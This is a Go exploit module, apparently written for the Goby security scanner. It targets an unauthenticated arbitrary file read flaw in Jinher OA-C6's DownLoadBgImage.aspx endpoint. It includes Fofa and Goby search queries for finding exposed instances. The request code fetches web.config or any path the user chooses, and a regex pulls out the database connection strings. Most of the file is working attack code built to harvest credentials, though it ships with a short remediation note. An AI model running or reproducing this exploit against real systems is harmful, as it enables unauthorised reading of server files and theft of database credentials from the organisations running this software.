package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "JinherOA-C6 /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx File Read Vulnerability",
    "Description": "<p>Jinher Network is a professional information service provider, providing Internet + supervision solutions for urban regulatory departments, and providing enterprises and institutions with organization and coordination OA system development platform, e-government integration platform, smart e-commerce platform and other services.</p><p>The DownLoadBgImage of the Jinhe OA-C6 interface has an arbitrary file reading vulnerability, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2024-09-10",
    "PostTime": "2024-09-11",
    "Author": "3013320359@qq.com",
    "FofaQuery": "title=\"金和协同管理平台\" || body=\"JHSoft.Web.AddMenu\" || body=\"Jinher Network\" || body=\"Jinher Network\" || body=\"/jc6/platform/\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\")",
    "GobyQuery": "title=\"金和协同管理平台\" || body=\"JHSoft.Web.AddMenu\" || body=\"Jinher Network\" || body=\"Jinher Network\" || body=\"/jc6/platform/\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\")",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p> 3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.config,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/C6/web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/web.config",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<configuration>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<connectionStrings>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<add key=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/web.config",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<connectionStrings>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "金和OA-C6接口 /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx 文件读取漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。<br></p><p>金和OA-C6接口DownLoadBgImage存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>&nbsp;3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "JinherOA-C6 /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx File Read Vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>Jinher Network is a professional information service provider, providing Internet + supervision solutions for urban regulatory departments, and providing enterprises and institutions with organization and coordination OA system development platform, e-government integration platform, smart e-commerce platform and other services.<br></p><p>The DownLoadBgImage of the Jinhe OA-C6 interface has an arbitrary file reading vulnerability, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`

	postOrGet_hN2hA2jH9cQ9 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path="
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/C6/web.config": " <connectionStrings>",
			}
			// 函数继承
			uploadFileFunc := postOrGet_hN2hA2jH9cQ9

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.config": {"/C6/web.config", "<connectionStrings>"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_hN2hA2jH9cQ9

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			// 获取返回结果url和返回请求头


			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			if mode == "web.config" {
				re, _ := regexp.Compile(`<connectionStrings>((.|\n)*?)</connectionStrings>`)
				//检查是否有匹配到内容
				fmt.Println(resp)
				if !re.MatchString(resp) {
					//正则匹配不到输出全部文件内容
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				match := re.FindStringSubmatch(resp)

				tmpresp := "Key information extraction:\r\ndatainfo: " + match[1]
				resp = tmpresp + "\r\n\r\nAll file contents:\r\n" + resp

			}
			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
